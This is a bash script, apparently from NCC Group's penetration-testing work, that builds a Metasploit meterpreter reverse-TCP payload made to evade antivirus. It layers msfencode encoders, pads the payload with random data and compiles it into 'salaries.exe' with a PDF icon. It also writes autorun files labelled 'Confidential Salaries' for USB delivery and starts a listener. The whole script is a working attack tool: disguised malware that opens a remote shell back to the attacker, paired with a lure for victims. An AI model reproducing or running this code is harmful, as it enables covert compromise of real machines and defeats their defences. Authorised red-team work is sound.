#!/usr/bin/env bash
# AV0id - Metapsloit Payload Anti-Virus Avoider
# Daniel Compton - NCCGroup
# www.commonexploits.com
# contact@commexploits.com
# Twitter = @commonexploits
# 05/2013
# Tested on Bactrack 5 and Kali only.
# Script updates can be found here, check you have the latest version: https://github.com/nccgroup/metasploitavevasion

# Credit to other A.V scripts and research by Astr0baby, Vanish3r & Hasan aka inf0g33k

# User options
OUTPUTNAME="salaries.exe" # The payload exe created name


# Script begins
#===============================================================================

VERSION="1.4"

# spinner for Metasploit Generator
spinlong ()
{
bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
barlength=${#bar}
i=0
while ((i < 100)); do
  n=$((i*barlength / 100))
  printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
  ((i += RANDOM%5+2))
  sleep 0.02
done
}


# spinner for random seed generator
spinlong2 ()
{
bar=" 011001110010010011101110011010101010101101010010101110"
barlength=${#bar}
i=0
while ((i < 100)); do
  n=$((i*barlength / 100))
  printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
  ((i += RANDOM%5+2))
  sleep 0.02
done
}

clear
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo -e "*** \e[01;31mAV\e[00m\e[01;32m0id\e[00m - Metasploit Shell A.V Avoider Version $VERSION  ***"
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
sleep 3
clear

#Check for gcc compiler
which i586-mingw32msvc-gcc >/dev/null 2>&1
if [ $? -eq 0 ]
	then
		echo ""
else
		echo ""
		echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc and try again"
		echo ""
		exit 1
fi

#Check for Metasploit
which msfconsole >/dev/null 2>&1 && which msfcli >/dev/null
if [ $? -eq 0 ]
	then
		echo ""
else
		echo ""
		echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit program, cant continue. Install and try again"
		echo ""
		exit 1
fi


# create a PDF icon

#Check for PDF icon files

ls /icons/icon.res >/dev/null 2>&1 && ls /icons/autorun.ico >/dev/null 2>&1
if [ $? -eq 0 ]
	then
		echo ""
	else
		echo ""
		echo -e "\e[01;31m[!]\e[00m I can't find the icon files I will need, I will try and just download this for you from the internet"
		echo ""
		sleep 2
		echo ""
		echo -e "\e[01;32m[-]\e[00m Attempting to download 2 files...please wait"
		echo ""
		mkdir icons >/dev/null 2>&1
		cd icons >/dev/null 2>&1
		wget http://www.commonexploits.com/tools/avoid/icon.res >/dev/null 2>&1
		wget http://www.commonexploits.com/tools/avoid/autorun.ico >/dev/null 2>&1
		sleep 2
		ls icon.res >/dev/null 2>&1 && ls autorun.ico >/dev/null 2>&1
		if [ $? -eq 0 ]
			then
			echo -e "\e[01;32m[+]\e[00m Success, icon files downloaded"
			cd ..
			echo ""
		else
			echo -e "\e[01;31m[!]\e[00m Unable to download the icon files, script will continue but you will not have the masked PDF exe or autorun icon"
			cd ..
			echo ""
		fi
fi

# Random Msfencode encoding iterations
#ITER=`seq 5 10 |sort -R |sort -R | head -1`
ITER=`shuf -i 10-20 -n 1`

echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m What system do you want the Metasploit listenter to run on? Enter 1 or 2 and press enter"
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use my current system and IP address"
echo ""
echo " 2. Use an alternative system, i.e public external address"
echo ""
echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
read INTEXT
	if [ "$INTEXT" = "1" ]
		then
			echo ""
			IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
			IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
			echo -e "\e[01;32m[-]\e[00m Local system selected, I will auto launch the listener for you on \e[01;32m"$IP"\e[00m"
			echo ""
			echo -e "\e[1;31m-------------------------------------------------------\e[00m"
			echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?"
			echo -e "\e[1;31m-------------------------------------------------------\e[00m"
			echo ""
			read PORT
	elif [ "$INTEXT" = "2" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Alternative system selected, I will not auto launch but provide you the code"
			echo ""
			echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
			echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
			echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
			echo ""
			read IP
			echo ""
			echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
			echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? - if on the internet try port 53 if restricted"
			echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
			echo ""
			read PORT
	else
		echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
		echo ""
		exit 1
fi
echo ""
echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload, please wait..."
echo ""
spinlong
#Payload creater
msfpayload windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c $ITER -t raw 2>/dev/null | msfencode -e x86/jmp_call_additive -c $ITER -t raw 2>/dev/null | msfencode -e x86/call4_dword_xor -c $ITER -t raw 2>/dev/null |  msfencode -e x86/shikata_ga_nai -c $ITER -t c > msf.c 2>/dev/null
echo ""
echo ""
# Menu
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file? - enter 1, 2, 3, 4 or 5 and press enter"
echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Normal - about 400K payoad  - fast compile - 13/46 A.V products detected as malicious"
echo ""
echo " 2. Stealth - about 1-2 MB payload - fast compile - 12/46 A.V products detected as malicious"
echo ""
echo " 3. Super Stealth - about 10-20MB payload - fast compile - 11/46 A.V detected as malicious"
echo ""
echo " 4. Insane Stealth - about 50MB payload - slower compile - 10/46 A.V detected as malicious"
echo ""
echo " 5. Desperate Stealth - about 100MB payload - slower compile - Not tested with A.V"
echo ""
echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
echo ""
read LEVEL
	if [ "$LEVEL" = "1" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Normal selected, please wait a few seconds"
			echo ""
			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
			echo ""
			spinlong2
			SEED=$(shuf -i 100000-500000 -n 1)
	elif [ "$LEVEL" = "2" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds"
			echo ""
			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
			echo ""
			spinlong2
			SEED=$(shuf -i 1000000-5000000 -n 1)
	elif [ "$LEVEL" = "3" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds"
			echo ""
			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
			echo ""
			spinlong2
			SEED=$(shuf -i 8000000-12000000 -n 1)
	elif [ "$LEVEL" = "4" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes"
			echo ""
			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
			echo ""
			spinlong2
			SEED=$(shuf -i 40000000-60000000 -n 1)
	elif [ "$LEVEL" = "5" ]
		then
			echo ""
			echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
			echo ""
			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
			echo ""
			spinlong2
			SEED=$(shuf -i 100000000-200000000 -n 1)
	else
			echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
			echo ""
			exit 1
fi

# build the c file ready for compile
echo ""
echo '#include <stdio.h>' >> build.c
echo 'unsigned char padding[]=' >> build.c
cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > random
sed -i 's/$/"/' random
sed -i 's/^/"/' random
cat random >> build.c
echo  ';' >> build.c
echo 'char payload[] =' >> build.c
cat msf.c |grep -v "unsigned" >> build.c
echo 'char comment[512] = "";' >> build.c
echo 'int main(int argc, char **argv) {' >> build.c
echo  '	(*(void (*)()) payload)();' >> build.c
echo '	return(0);' >> build.c
echo '}' >> build.c

# gcc compile the exploit

ls icon.res >/dev/null 2>&1
	if [ $? -eq 0 ]
		then
			i586-mingw32msvc-gcc -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
		else
			i586-mingw32msvc-gcc -Wall -mwindows build.c -o "$OUTPUTNAME"
fi

# check if file built correctly
LOCATED=`pwd`
ls "$OUTPUTNAME" >/dev/null 2>&1
	if [ $? -eq 0 ]
		then
			echo ""
			echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
	else
			echo ""
			echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
			echo ""
			exit 1
fi

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label=Confidential Salaries" >> autorun/autorun.inf
echo ""
echo -e "\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB"

# clean up temp files
rm build.c >/dev/null 2>&1
rm random >/dev/null 2>&1
rm msf.c >/dev/null 2>&1


echo ""
sleep 2
	if [ "$INTEXT" = "1" ] 
		then
			echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener, please wait..."
			echo ""
			msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E 2>/dev/null
		else
			echo ""
			echo -e "\e[01;32m[-]\e[00m Run the following code on your listener system:"
			echo ""
			echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
			echo ""
			echo "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E"
			echo ""
			echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
			echo ""
fi